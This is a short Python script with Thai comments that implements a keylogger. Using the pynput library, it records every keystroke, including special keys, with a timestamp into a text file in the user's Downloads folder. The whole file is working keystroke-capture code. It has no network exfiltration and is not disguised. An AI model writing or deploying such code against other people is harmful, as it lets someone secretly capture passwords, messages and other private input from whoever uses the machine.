from pynput import keyboard
import os
from datetime import datetime

# กำหนดฟังก์ชันในการสร้างชื่อไฟล์ใหม่ที่มีวันที่และเวลา
def generate_log_filename():
    # สร้างชื่อไฟล์ใหม่ด้วยวันที่และเวลา
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"keylog_{timestamp}.txt"
    # เปลี่ยนตำแหน่งไปที่โฟลเดอร์ Downloads
    return os.path.join(os.path.expanduser("~"), "Downloads", filename)

# กำหนดเส้นทางไฟล์ .txt ในโฟลเดอร์ Downloads โดยเรียกใช้ฟังก์ชัน generate_log_filename
log_file_path = generate_log_filename()

# ฟังก์ชันที่จะเรียกเมื่อมีการกดปุ่ม
def on_press(key):
    try:
        with open(log_file_path, "a") as log_file:
            log_file.write(f'{datetime.now()} - {key.char}\n')  # เพิ่มเวลาเมื่อบันทึกแต่ละปุ่ม
    except AttributeError:
        with open(log_file_path, "a") as log_file:
            log_file.write(f'{datetime.now()} - [{key}]\n')  # สำหรับปุ่มพิเศษ

# เริ่มการดักฟังการกดปุ่ม
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
